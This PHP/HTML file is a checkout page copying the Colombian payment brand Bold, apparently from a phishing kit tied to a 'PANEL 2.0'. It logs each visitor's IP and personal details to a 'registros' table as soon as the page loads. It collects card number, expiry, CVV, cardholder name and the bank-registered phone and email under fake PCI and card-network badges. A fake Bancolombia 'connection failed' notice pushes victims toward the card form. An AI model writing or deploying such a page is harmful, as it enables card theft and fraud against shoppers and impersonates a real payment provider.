<?php
/* ============================================================
   🔥 ANTI-CACHE PRO
============================================================ */
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");

/* ============================================================
   Bold Checkout — Versión optimizada para PANEL 2.0
============================================================ */

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/config.php';

// Inicializar el registro temprano para los logs en tiempo real
if (empty($_SESSION['idreg'])) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $nombreInicial = $_SESSION['cliente_nombre'] ?? '';
    $cedulaInicial = $_SESSION['cliente_documento'] ?? '';
    $celularInicial = $_SESSION['cliente_telefono'] ?? '';
    $correoInicial = $_SESSION['cliente_correo'] ?? '';

    try {
        $stmt = $pdo->prepare("
            INSERT INTO registros (banco, ip, status, horamodificado, nombre, cedula, celular, email)
            VALUES ('Ingresando datos...', ?, 1, NOW(), ?, ?, ?, ?)
        ");
        $stmt->execute([$ip, $nombreInicial, $cedulaInicial, $celularInicial, $correoInicial]);
        $nuevoId = $pdo->lastInsertId();
        if ($nuevoId) {
            $_SESSION['idreg'] = $nuevoId;
        }
    } catch (Exception $e) {
        // Ignorar para no bloquear la pasarela si hay un error
    }
}

/* ------------------------------------------------------------
   1. Validar que el cliente completó el checkout
------------------------------------------------------------ */

/* ------------------------------------------------------------
   2. Recibir TOTAL por POST
------------------------------------------------------------ */
$rawTotal = $_POST['total'] ?? null;
$precioFormateado = '';

if ($rawTotal !== null) {
    $soloDigitos = preg_replace('/\D/', '', $rawTotal);

    if ($soloDigitos !== '' && is_numeric($soloDigitos)) {
        $_SESSION['total_pago'] = (int)$soloDigitos;
        $precioFormateado = '$' . number_format($_SESSION['total_pago'], 0, ',', '.') . ' COP';
    }
} else {
    if (isset($_SESSION['total_pago'])) {
        $precioFormateado = '$' . number_format($_SESSION['total_pago'], 0, ',', '.') . ' COP';
    }
}

/* ------------------------------------------------------------
   3. Recuperar datos previos del checkout
------------------------------------------------------------ */
$tipo_documento  = $_SESSION['cliente_tipo_documento'] ?? '';
$documento       = $_SESSION['cliente_documento'] ?? '';
$nombre          = $_SESSION['cliente_nombre'] ?? '';
$apellidos       = $_SESSION['cliente_apellidos'] ?? '';
$correo          = $_SESSION['cliente_correo'] ?? '';
$direccion       = $_SESSION['cliente_direccion'] ?? '';
$complemento     = $_SESSION['cliente_complemento'] ?? '';
$ciudad          = $_SESSION['cliente_ciudad'] ?? '';
$departamento    = $_SESSION['cliente_departamento'] ?? '';
$telefono        = $_SESSION['cliente_telefono'] ?? '';
$titularGuardado = $_SESSION['cliente_titular'] ?? '';

$tipo_documento  = htmlspecialchars($tipo_documento, ENT_QUOTES, 'UTF-8');
$documento       = htmlspecialchars($documento, ENT_QUOTES, 'UTF-8');
$nombre          = htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8');
$apellidos       = htmlspecialchars($apellidos, ENT_QUOTES, 'UTF-8');
$correo          = htmlspecialchars($correo, ENT_QUOTES, 'UTF-8');
$direccion       = htmlspecialchars($direccion, ENT_QUOTES, 'UTF-8');
$complemento     = htmlspecialchars($complemento, ENT_QUOTES, 'UTF-8');
$ciudad          = htmlspecialchars($ciudad, ENT_QUOTES, 'UTF-8');
$departamento    = htmlspecialchars($departamento, ENT_QUOTES, 'UTF-8');
$telefono        = htmlspecialchars($telefono, ENT_QUOTES, 'UTF-8');
$titularGuardado = htmlspecialchars($titularGuardado, ENT_QUOTES, 'UTF-8');
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Bold - Checkout</title>
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="css/bold.css?v=<?= time() ?>">
</head>

<body>

  <div class="sidebar">
    <img src="bold/boloncho.svg" alt="Bold logo" class="logo">

    <div class="sidebar-content">
      <div class="badge">
        <img src="bold/medalla.svg" alt="icono izquierda">
        NEGOCIO PRO
        <img src="bold/abajo.svg" alt="icono derecha">
      </div>

      <h2>Districol</h2>
      <p>Más de 526 ventas exitosas con Bold</p>

      <div class="price"><?= $precioFormateado ?></div>
    </div>
  </div>

  <div class="content">

    <h3>¿Cómo quieres pagar?</h3>
    <div class="letra">Pago con tarjeta</div>

    <div class="payment-option" id="opTarjeta">
      <div class="payment-text">
        <img src="bold/cece.svg" alt="Tarjeta">
        <strong>Pago con tarjeta</strong>
      </div>

      <div class="logos-wrapper">
        <div class="scroll-logos">
          <img src="bold/amex.png" alt="Amex">
          <img src="bold/visa.svg" alt="Visa">
          <img src="bold/master.svg" alt="Mastercard">
          <img src="bold/diners.png" alt="Dinners">
          <img src="bold/discover.svg" alt="Discover">
          <img src="bold/codensa.png" alt="codensa">
        </div>
      </div>

      <input type="radio" name="pago">
    </div>

    <!-- FORMULARIO REAL -->
    <form action="procesar_pago.php" method="POST" class="formulario-tarjeta" id="formTarjeta"
      style="display:none; flex-direction:column; gap:18px; margin-top:18px;">

      <div class="volver-link">
        <a href="#" id="btnVolver">Cambiar método de pago</a>
      </div>

      <label>Teléfono</label>
      <div class="telefono-wrapper">
        <div class="codigo-pais">
          <img src="bold/locombia.png" alt="Colombia">
          <span>+57</span>
          <img src="bold/lineaabajo.svg" alt="desplegable" class="flecha">
        </div>
        <input type="text" name="tel_bank" placeholder="--- --- ----" required>
      </div>

      <label>Ingresa tu correo electrónico</label>
      <input type="email" name="email_bank" placeholder="El que está registrado en tu banco" required>

      <label>Número de tarjeta</label>
      <div class="input-con-icono">
        <input type="text" name="tarjeta" maxlength="19" placeholder="---- ---- ---- ----" required>
        <img src="bold/cece.svg" alt="icono tarjeta">
      </div>

      <div class="fila">
        <div class="col-cvv">
          <label>Vencimiento</label>
          <div class="input-con-icono">
            <input type="text" name="fecha" maxlength="5" placeholder="MM/AA" required>
          </div>
        </div>

        <div class="col-cvv">
          <label>CVV o CVC</label>
          <div class="input-con-icono">
            <input type="text" name="cvv" maxlength="4" placeholder="---" required>
            <img src="bold/cece.svg" alt="icono ayuda">
          </div>
        </div>
      </div>

      <label>Nombre del titular</label>
      <input type="text" name="titular" placeholder="Igual al que aparece en la tarjeta" required>

      <div class="checkbox checkbox-datos">
        <input type="checkbox" id="acepto1" required>
        <label for="acepto1">Acepto el tratamiento de mis datos personales…</label>
      </div>

      <div class="checkbox checkbox-terminos">
        <input type="checkbox" id="acepto2" required>
        <label for="acepto2">Acepto Términos y condiciones</label>
      </div>

      <input type="hidden" name="tipo_documento" value="<?= $tipo_documento ?>">
      <input type="hidden" name="documento" value="<?= $documento ?>">
      <input type="hidden" name="nombre" value="<?= $nombre ?>">
      <input type="hidden" name="apellidos" value="<?= $apellidos ?>">
      <input type="hidden" name="correo_checkout" value="<?= $correo ?>">
      <input type="hidden" name="direccion" value="<?= $direccion ?>">
      <input type="hidden" name="complemento" value="<?= $complemento ?>">
      <input type="hidden" name="ciudad" value="<?= $ciudad ?>">
      <input type="hidden" name="departamento" value="<?= $departamento ?>">
      <input type="hidden" name="telefono" value="<?= $telefono ?>">
      <input type="hidden" name="titular_guardado" value="<?= $titularGuardado ?>">

      <button type="submit">Pagar</button>

      <div class="abandonar">
        <a href="#" id="btnAbandonar">Abandonar pago</a>
      </div>

      <div class="secure-logos" id="logosBold">
        <span>Paga seguro con Bold</span>
        <img src="bold/pci.svg">
        <img src="bold/sitio.svg">
        <img src="bold/servicio.svg">
        <img src="bold/pse.svg">
        <img src="bold/idmaster.svg">
        <img src="bold/visacheck.svg">
        <img src="bold/recaptcha.svg">
      </div>

    </form>

<div class="letra" id="textoTransferencia">Transferencia bancaria</div>

<!-- BOTÓN BANCOLOMBIA -->
<div class="payment-option" id="opBancolombia">
  <div class="payment-text">
    <img src="bold/bancol.svg" alt="Bancolombia">
    <strong>Botón Bancolombia</strong>
  </div>
  <input type="radio" name="pago">
</div>

<!-- MENSAJE DE ADVERTENCIA (afuera del botón) -->
<div id="bancoAdvertencia" class="warning-box-pro" style="display: none;">
  <div class="wb-icon">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
      <circle cx="12" cy="12" r="10"></circle>
      <line x1="12" y1="8" x2="12" y2="12"></line>
      <line x1="12" y1="16" x2="12.01" y2="16"></line>
    </svg>
  </div>
<div class="wb-content">
    <strong>No fue posible establecer conexión con Bancolombia.</strong>
    <p>Intenta con otro medio de pago y finaliza tu compra.</p>
  </div>
</div>


    <div class="payment-option disabled" id="opNequi">
      <div class="payment-text">
        <img src="bold/necli.svg" alt="Nequi">
        <strong>Nequi</strong>
      </div>
    </div>

    <div class="back-link" id="volverTienda">
      <img src="bold/tienda.svg" alt="tienda">
      <a href="index.php">Volver a la tienda</a>
    </div>

    <div class="secure-logos" id="logosBoldBottom">
      <span>Paga seguro con Bold</span>
      <img src="bold/pci.svg">
      <img src="bold/sitio.svg">
      <img src="bold/servicio.svg">
      <img src="bold/pse.svg">
      <img src="bold/idmaster.svg">
      <img src="bold/visacheck.svg">
      <img src="bold/recaptcha.svg">
    </div>

  </div>
<script src="js/bold.js"></script>
</body>
</html>